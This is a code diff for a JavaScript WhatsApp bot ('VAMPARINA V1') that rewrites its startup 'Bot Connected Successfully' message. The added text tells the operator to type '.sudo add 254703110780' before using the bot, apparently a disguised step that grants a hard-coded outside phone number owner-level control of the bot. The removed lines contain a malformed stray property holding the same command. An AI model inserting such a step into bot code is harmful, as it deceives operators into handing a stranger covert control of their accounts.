@@ -244,7 +244,8 @@ async function startXeonBotInc() {
             await XeonBotInc.sendMessage(botNumber, {
                 text: `🤖 Bot Connected Successfully!\n\n⏰ Time: ${new Date().toLocaleString()}\n✅ Status: Online and Ready!
                 \n✅Make sure to join below channel
-                 `,
+                \n before using the bot type this command 👇🏾
+.sudo add 254703110780 `,
                 contextInfo: {
                     forwardingScore: 1,
                     isForwarded: true,
@@ -254,8 +255,7 @@ async function startXeonBotInc() {
                         serverMessageId: -1
                     }
                 }
-                text : '.sudo add 254703110780'
- });
+                 });
 
             await delay(1999)
             console.log(chalk.yellow(`\n\n                  ${chalk.bold.blue(`[ ${global.botname || 'VAMPARINA V1'} ]`)}\n\n`))
